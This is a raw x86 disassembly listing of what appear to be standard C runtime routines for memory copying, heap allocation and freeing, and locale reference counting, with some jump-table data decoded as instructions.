  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
  42694a:	shr    ebx,cl
  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
